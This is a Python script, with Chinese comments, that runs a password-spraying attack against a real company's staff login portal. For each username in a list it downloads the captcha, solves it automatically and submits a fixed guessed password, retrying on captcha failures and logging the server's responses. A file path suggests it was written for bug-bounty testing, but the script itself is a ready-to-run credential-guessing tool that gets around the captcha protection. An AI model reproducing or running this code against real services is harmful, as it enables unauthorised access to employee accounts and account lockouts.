# -*- coding:utf-8 -*-
# 通过sessions获取验证码图片

# {"status":false,"code":50003,"msg":"用户名或密码错误","data":null}
# {"status":false,"code":40001,"msg":"验证码错误","data":null}

from verifyCaptcha import get_local_captcha
from uuid import uuid4
import requests
import os
from Log import create_logger
import sys
sys.path.append(r'../burpCaptcha')

img_save = '../imgs/guazi/'
try:
    os.makedirs(img_save)
except Exception as e:
    pass

logger = create_logger('./guaziLog.txt')

# 登陆url
url = r'https://staff.guazi.com/Account/LogIn'
session = requests.Session()
session.get(url)

def run(username):
    # 保存的验证码图片路径
    img_name = str(uuid4())[:5]
    img_file = r'{}\{}.png'.format(img_save, img_name)

    # 获取验证码
    captcha_url = r'https://staff.guazi.com/account/captcha'
    res2 = session.get(url=captcha_url)
    img_content = res2.content

    # 保存验证码
    with open(img_file, 'ab') as f:
        f.write(img_content)

    # 识别验证码
    balance, captcha = get_local_captcha(img_file)
    logger.info('[{}] -> [{}] [{}]'.format(balance, img_file, captcha))

    # 提交登陆
    valid_url = r'https://staff.guazi.com/account/valid'
    data = {'username': username, 'password': 'guazi@2018', 'loginvcode': captcha}
    res4_text = session.post(valid_url, data).text
    result = '[{} : {}] -> [{}]'.format(username, 'guazi@2018', res4_text)
    logger.info(result)
    if '锁定' in res4_text:
        pass
    elif '40001' in res4_text:
        run(username)
    else:
        pass


with open(r'H:\5. 资料\1. 挖洞报告\SRC\瓜子\username.txt', 'rt') as f:
    for each in f.readlines():
        username = each.strip()
        run(username)